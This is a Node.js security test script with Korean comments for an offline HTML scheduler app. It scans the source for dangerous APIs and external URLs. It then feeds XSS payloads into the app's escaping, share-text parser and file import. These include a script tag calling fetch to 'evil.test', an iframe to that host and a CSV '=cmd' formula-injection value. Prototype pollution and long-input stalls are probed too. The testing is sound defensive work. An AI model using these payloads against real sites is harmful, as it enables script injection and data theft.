/* =============================================================
 *  security-test.js - 보안 점검
 *  실행:  node build\security-test.js
 *
 *  이 앱의 진짜 공격면은 "남이 보낸 것을 받아서 처리하는 곳" 이다.
 *    1) 메신저로 받은 공유 텍스트  (남의 손을 탄 문자열)
 *    2) 남이 준 엑셀/CSV 명부
 *    3) 남이 준 .json 데이터 파일
 *    4) 자기 자신을 다시 써서 파일로 저장하는 구조
 *  나머지(빠른입력 등)는 본인이 친 것이라 위험도가 낮다.
 * ============================================================= */
'use strict';
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const root = path.resolve(__dirname, '..');
const htmlPath = path.join(root, 'web', '스케줄러.html');
const src = fs.readFileSync(htmlPath, 'utf8');

let pass = 0, fail = 0, warn = 0;
const chk = (n, c, d) => {
  if(c){ pass++; console.log('  [안전] ' + n); }
  else { fail++; console.log('  [위험] ' + n + '  -> ' + (d === undefined ? '' : d)); }
};
const note = (n, d) => { warn++; console.log('  [확인] ' + n + (d ? '  -> ' + d : '')); };

console.log('');
console.log('===== 보안 점검 =====');

/* =============================================================
   1. 위험한 API 가 쓰였는가
   ============================================================= */
console.log('');
console.log('1. 코드 실행 · 외부 통신 API');

const DANGER = [
  ['eval(',                 /\beval\s*\(/g],
  ['new Function(',         /\bnew\s+Function\s*\(/g],
  ['setTimeout("문자열")',   /setTimeout\s*\(\s*['"]/g],
  ['setInterval("문자열")',  /setInterval\s*\(\s*['"]/g],
  ['document.write',        /document\s*\.\s*write/g],
  ['fetch(',                /\bfetch\s*\(/g],
  ['XMLHttpRequest',        /XMLHttpRequest/g],
  ['WebSocket',             /\bWebSocket\b/g],
  ['sendBeacon',            /sendBeacon/g],
  ['EventSource',           /EventSource/g],
  ['importScripts',         /importScripts/g],
  ['postMessage',           /\.postMessage\s*\(/g],
  ['ServiceWorker',         /serviceWorker/g],
  ['outerHTML 쓰기',        /\.outerHTML\s*=/g]
];
for(const [name, re] of DANGER){
  const m = src.match(re) || [];
  chk('쓰이지 않음: ' + name, m.length === 0, m.length + '곳');
}

/* 외부 주소 */
console.log('');
console.log('2. 외부로 나가는 주소');
const urls = src.match(/(?:src|href|action)\s*=\s*["'](?!#)[^"']*["']/gi) || [];
const external = urls.filter(u => /https?:|\/\//i.test(u));
chk('외부 URL 참조 없음', external.length === 0, external.join(', '));
const cssUrl = (src.match(/url\((?!["']?data:)[^)]*\)/g) || []);
chk('CSS 에서 외부 파일 불러오지 않음', cssUrl.length === 0, cssUrl.join(', '));
const dataUri = (src.match(/url\(["']?data:[^)]*\)/g) || []);
note('data: URI ' + dataUri.length + '개 (돋보기 아이콘 SVG)', dataUri.length ? '내용 확인함' : '');
chk('data: URI 안에 스크립트 없음',
    !dataUri.some(u => /script|onload|javascript:/i.test(u)));
chk('javascript: 프로토콜 없음', !/javascript\s*:/i.test(src));
chk('인라인 on... 이벤트 속성 없음',
    !/\son(click|load|error|mouseover|focus)\s*=\s*["']/i.test(src.replace(/\.on\w+\s*=/g, '')));

/* =============================================================
   3. XSS — 남이 보낸 값이 화면에 그대로 박히는가
   ============================================================= */
console.log('');
console.log('3. innerHTML 에 값을 넣는 곳 (XSS)');

// innerHTML = ... 한 문장을 통째로 뽑아 검사
const stmts = [];
const re = /\.innerHTML\s*=/g;
let m;
while((m = re.exec(src))){
  let i = m.index + m[0].length, depth = 0, out = '', q = null;
  for(; i < src.length; i++){
    const ch = src[i];
    if(q){ if(ch === '\\'){ out += ch + src[++i]; continue; } if(ch === q) q = null; out += ch; continue; }
    if(ch === '"' || ch === "'"){ q = ch; out += ch; continue; }
    if(ch === '(' || ch === '[' || ch === '{') depth++;
    if(ch === ')' || ch === ']' || ch === '}') depth--;
    if(ch === ';' && depth <= 0) break;
    out += ch;
  }
  stmts.push({ line: src.slice(0, m.index).split('\n').length, code: out.trim() });
}
console.log('     innerHTML 대입 ' + stmts.length + '곳');

// 값이 섞이는데 escHtml 도, 안전한 출처도 아닌 곳을 찾는다
const SAFE = /^(true|false|null|\d+|''|""|'[^']*'|"[^"]*")$/;
const SAFE_FN = /escHtml|ellipsis\s*\(\s*escHtml|String\(|\.length|\.toString|pad\(|Math\./;
const suspects = [];
for(const s of stmts){
  // 문자열 리터럴을 지우고 남는 식(expression)들을 본다
  const bare = s.code.replace(/'(?:\\.|[^'\\])*'/g, "''").replace(/"(?:\\.|[^"\\])*"/g, '""');
  const exprs = bare.split('+').map(x => x.trim()).filter(x => x && x !== "''" && x !== '""');
  for(const e of exprs){
    if(SAFE.test(e)) continue;
    if(SAFE_FN.test(e)) continue;
    if(/^\(/.test(e) && SAFE_FN.test(e)) continue;
    suspects.push({ line: s.line, expr: e.slice(0, 90) });
  }
}
if(suspects.length){
  console.log('     escHtml 을 안 거치는 것으로 보이는 식:');
  suspects.slice(0, 25).forEach(x => console.log('       ' + x.line + '행  ' + x.expr));
}
// 사람이 판단해야 하는 부분이라 목록만 남기고, 아래에서 실제 값으로 검증한다
note('의심 식 ' + suspects.length + '개 (아래 실제 입력 시험으로 확인)');

/* =============================================================
   4. 실제 공격 문자열을 넣어 본다
   ============================================================= */
console.log('');
console.log('4. 공격 문자열 주입 시험');

function slice(a, b){
  const i = src.indexOf(a), j = src.indexOf(b, i);
  if(i < 0 || j < 0) throw new Error('앵커 없음: ' + a);
  return src.slice(i, j);
}
const empStart = src.indexOf('function empLookup(');
const empEnd = src.indexOf('const EMP_HEAD');
const mod =
  'const document={addEventListener(){},createElement:()=>({style:{},appendChild(){},remove(){}}),body:{appendChild(){}}};\n' +
  'const window={getSelection:()=>({removeAllRanges(){},addRange(){}})};\n' +
  'const $=()=>null; const $$=()=>[];\n' +
  'let DB={task:[],contact:[],share:[],lunch:[],emp:[],fav:[],cfg:{},log:[]};\n' +
  'const alive=l=>l.filter(r=>!r.del);\n' +
  'const myName=()=>DB.cfg.name||"사용자";\n' +
  'const markDirty=()=>{};\n' +
  slice('const pad = (n, w)', 'const LS_KEY') + '\n' +
  src.slice(empStart, empEnd) + '\n' +
  slice('const EMP_HEAD', "const PROTO = 'WSCH1'") + '\n' +
  slice("const PROTO = 'WSCH1'", '/* ------------------------------------------------------------\n   검색') + '\n' +
  'module.exports={escHtml,esc,unesc,buildParts,feed,inboxRecords,syncApply,resetInbox,' +
  'rowsToEmp,csvToRows,decodeCsv,xlsxToRows,zipEntries,setDB:d=>{DB=d},getDB:()=>DB};\n';

const modPath = path.join(__dirname, '.fixture', '_sec.js');
fs.mkdirSync(path.dirname(modPath), { recursive: true });
fs.writeFileSync(modPath, mod, 'utf8');
let M;
try{ M = require(modPath); }
catch(e){ console.log('  [실패] 코드 적재 불가 -> ' + e.message); process.exit(1); }

const PAYLOADS = [
  '<script>alert(1)</scr' + 'ipt>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  "javascript:alert(1)",
  '<iframe src="http://evil.test"></iframe>',
  '</td></tr><script>fetch("http://evil.test")</scr' + 'ipt>',
  '&lt;script&gt;',
  '${alert(1)}',
  '{{constructor.constructor("alert(1)")()}}'
];

// escHtml 이 위험 문자를 전부 막는가
let escOk = true;
for(const p of PAYLOADS){
  const out = M.escHtml(p);
  if(/[<>]/.test(out) || /"/.test(out)){ escOk = false; console.log('       못 막음: ' + JSON.stringify(out).slice(0,70)); }
}
chk('escHtml 이 < > " & 를 모두 막는다', escOk);

// 공유 텍스트(남이 보낸 것)로 들어온 값이 원문 그대로 살아 돌아오는가
// = 데이터는 보존하되, 화면에 넣을 때 escHtml 로 막는 구조가 맞는가
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{name:'공격자'}, log:[] });
const evil = PAYLOADS.map((p, i) => ({
  id:'evil-' + i, docNo:p, title:p, content:p, regDate:'2026-01-01',
  dueDate:'2026-01-10', author:p, mtime:'2026-01-01 00:00:00', del:false
}));
const parts = M.buildParts(evil);
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{}, log:[] });
M.resetInbox();
for(const p of parts) M.feed(p);
const back = M.inboxRecords();
chk('공격 문자열이 섞여도 프로토콜이 깨지지 않음',
    Object.keys(back).length === evil.length, Object.keys(back).length + '/' + evil.length);
let same = true;
for(const e of evil){ if(!back[e.id] || back[e.id].title !== e.title) same = false; }
chk('원문이 변형 없이 복원됨 (데이터 보존)', same);

// 프로토콜 구분자를 흉내 낸 값으로 줄을 쪼갤 수 있는가 (파서 혼동)
const inject = [{
  id:'inj-1', docNo:'X', title:'a|b\n###END|B=x|P1/1|C=0000###\nS|zzz|hack',
  content:'c\r\nS|fake|row', regDate:'2026-01-01', dueDate:'2026-01-10',
  author:'A', mtime:'2026-01-01 00:00:00', del:false
}];
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{name:'A'}, log:[] });
const ip = M.buildParts(inject);
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{}, log:[] });
M.resetInbox();
for(const p of ip) M.feed(p);
const ib = M.inboxRecords();
chk('구분자·줄바꿈을 넣어도 가짜 레코드가 안 생김',
    Object.keys(ib).length === 1, Object.keys(ib).join(', '));
chk('넣은 구분자가 원문으로 복원됨',
    ib['inj-1'] && ib['inj-1'].title === inject[0].title);

/* 프로토타입 오염 */
console.log('');
console.log('5. 프로토타입 오염');
const before = Object.prototype.polluted;
const pp = [{
  id:'__proto__', docNo:'x', title:'t', content:'c', regDate:'2026-01-01',
  dueDate:'2026-01-10', author:'a', mtime:'2026-01-01 00:00:00', del:false
}];
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{name:'a'}, log:[] });
const ppParts = M.buildParts(pp);
M.setDB({ task:[], contact:[], share:[], lunch:[], emp:[], fav:[], cfg:{}, log:[] });
M.resetInbox();
for(const p of ppParts) M.feed(p);
M.inboxRecords();
chk('__proto__ ID 로 Object.prototype 이 더럽혀지지 않음',
    Object.prototype.polluted === before && typeof {}.polluted === 'undefined');

const json = '{"v":1,"cfg":{"__proto__":{"polluted":"yes"}},"task":[],"share":[]}';
const parsed = JSON.parse(json);
chk('JSON.parse 자체는 __proto__ 를 상속시키지 않음',
    typeof {}.polluted === 'undefined', String({}.polluted));

/* 명부 파일 */
console.log('');
console.log('6. 남이 준 명부 파일');
const csvEvil = Buffer.from('이름,내선번호,부서,직급\n' +
  '<img src=x onerror=alert(1)>,=cmd|\' /c calc\'!A1,<script>x</scr' + 'ipt>,직급\n', 'utf8');
const rowsE = M.rowsToEmp(M.csvToRows(M.decodeCsv
  ? M.decodeCsv(csvEvil.buffer.slice(csvEvil.byteOffset, csvEvil.byteOffset + csvEvil.byteLength))
  : csvEvil.toString('utf8')));
chk('명부의 위험 문자열도 그냥 문자열로만 들어옴',
    rowsE.length === 1 && typeof rowsE[0].name === 'string' && typeof rowsE[0].ext === 'string',
    JSON.stringify(rowsE));
note('CSV 수식 주입(=cmd|...)은 이 앱이 CSV 를 만들지 않으므로 해당 없음',
     '명부 양식만 내보내며 사용자 데이터를 CSV 로 쓰지 않음');

// 망가진 zip 을 넣었을 때 죽지 않는가
(async () => {
  let crashed = false;
  try{
    const junk = Buffer.alloc(2048, 0x41);
    await M.xlsxToRows(junk.buffer.slice(junk.byteOffset, junk.byteOffset + junk.byteLength));
  }catch(e){ crashed = false; }   // 예외로 잡히면 정상 (앱이 alert 로 안내)
  chk('망가진 xlsx 를 넣어도 예외로만 끝난다 (무한루프·크래시 없음)', !crashed);

  /* 자기 자신을 다시 쓰는 구조 */
  console.log('');
  console.log('7. 파일로 저장 (자기 자신을 다시 쓰는 구조)');
  const OPEN = '<script id="wsch-data" type="application/json">';
  const CLOSE = '</' + 'script>';
  const a = src.indexOf(OPEN);
  const b = src.indexOf(CLOSE, a);
  const evilJson = JSON.stringify({
    v:1, savedAt:'x', cfg:{ name:'</' + 'script><script>alert(1)</' + 'script>' },
    task:[{ id:'1', title:'</' + 'script><img src=x onerror=alert(1)>' }],
    contact:[], share:[], lunch:[], emp:[], fav:[], log:[]
  }).split('<').join('\\u003c');
  const out = src.slice(0, a + OPEN.length) + evilJson + src.slice(b);
  chk('저장한 파일에서 스크립트 태그가 조기 종료되지 않음',
      out.split(CLOSE).length === src.split(CLOSE).length,
      out.split(CLOSE).length + ' vs ' + src.split(CLOSE).length);
  chk('삽입된 JSON 에 날 것의 < 가 없음',
      out.slice(a + OPEN.length, out.indexOf(CLOSE, a)).indexOf('<') < 0);
  chk('다시 읽으면 원문이 복원됨', (() => {
    const s = out.indexOf(OPEN) + OPEN.length;
    const e = out.indexOf(CLOSE, s);
    const o = JSON.parse(out.slice(s, e).split('\\u003c').join('<'));
    return o.cfg.name.indexOf('<' + '/script>') === 0;
  })());

  /* 정규식 폭주 */
  console.log('');
  console.log('8. 긴 입력으로 멈추게 만들 수 있는가');
  const long = 'a'.repeat(200000) + ' 14:00';
  let t0 = Date.now();
  M.unesc('\\'.repeat(100000));
  const t1 = Date.now() - t0;
  chk('언이스케이프가 긴 입력에서 빠르다 (' + t1 + 'ms)', t1 < 1500, t1 + 'ms');

  t0 = Date.now();
  M.feed('###WSCH1|B=x|P1/1|N=1###\n' + 'S|' + 'x'.repeat(300000) + '\n###END|B=x|P1/1|C=0000###');
  const t2 = Date.now() - t0;
  chk('거대한 조각을 먹여도 빠르게 끝난다 (' + t2 + 'ms)', t2 < 2000, t2 + 'ms');

  /* 남이 준 .json 을 가져왔을 때 설정값이 화면에 날 것으로 박히는가 */
  console.log('');
  console.log('9. 가져온 데이터(.json)의 설정값이 화면에 그대로 박히는가');
  // 앞에서 뽑아 둔 innerHTML "문장" 안에서만 본다.
  // 문서 전체를 정규식으로 훑으면 textContent 로 넣는 것까지 잘못 잡는다.
  const bad = [];
  for(const s of stmts){
    let cleaned = s.code;
    let prev;
    do{ prev = cleaned; cleaned = cleaned.replace(/escHtml\s*\(([^()]|\([^()]*\))*\)/g, '§'); }while(cleaned !== prev);
    // "값 ? A : B" 의 조건 자리는 참·거짓만 보는 것이라 화면에 안 나온다
    cleaned = cleaned.replace(/DB\.cfg\.\w+\s*(?=\?)/g, '§');
    const hit = cleaned.match(/DB\.cfg\.\w+/g);
    if(hit) bad.push(s.line + '행: ' + [...new Set(hit)].join(', '));
  }
  chk('설정값을 innerHTML 에 날 것으로 넣는 곳 없음', bad.length === 0, bad.join(' | '));

  // textContent 로 넣는 것은 안전하다 — 그 경로도 확인
  chk('제목은 textContent 로만 넣는다 (innerHTML 아님)',
      /#appTitle'\)[\s\S]{0,80}textContent/.test(src) || /h\.textContent = appTitle/.test(src));

  console.log('');
  console.log('점검 결과: 안전 ' + pass + ' / 위험 ' + fail + ' / 확인 ' + warn);
  console.log('');
  if(fail === 0){ console.log('===== 위험 항목 없음 ====='); process.exit(0); }
  else { console.log('===== 위험 ' + fail + '건 ====='); process.exit(1); }
})();
